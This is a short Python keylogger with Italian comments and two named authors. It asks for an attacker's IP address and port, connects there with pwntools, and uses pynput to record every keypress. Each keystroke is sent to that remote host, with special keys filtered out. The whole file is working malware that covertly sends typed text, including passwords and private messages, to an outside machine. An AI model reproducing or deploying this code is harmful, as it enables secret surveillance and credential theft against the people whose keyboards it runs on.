################################
# Alan Bovo, Simone Ceccarelli #
################################

from pynput.keyboard import Key, Listener   #uso le librerie
from pwn import *   #uso le librerie

ip = input(str("Inserisci l'ip: ")) #chiedo l'ip dell'attaccante
ip = str(ip).replace("\n", "")  #levo il carattere a capo dall'ip

port = input(str("Inserisci la porta: "))   #chiedo la porta dell'attaccante
port = str(port).replace("\n", "")  #levo il carattere a capo dalla porta

port = int(port)    #converto la porta da stringa a intero

conn = remote(ip, port) #mi connetto all'attaccante
    
def scrivi(key):    #definisco la funzione per inviare i tasti intercettati
    key = str(key).replace("'", "") #rimuovo il carattere '
    
    key = str(key).replace("Key.backspace", "") #rimouvo il tasto cancella
    key = str(key).replace("Key.enter", "\n")   #rimuovo il tasto a capo
    key = str(key).replace("Key.space", " ")    #rimuovo il tasto spazio           
    
    if 'Key' in key:    #rimuovo tutti i tasti speciali
        key = ''
        
    conn.send(key)  #invio il tasto intercettato
                           
with Listener(
    on_press = scrivi
    ) as listener:
    listener.join() #definisco l'oggetto che intercetterà i dati
    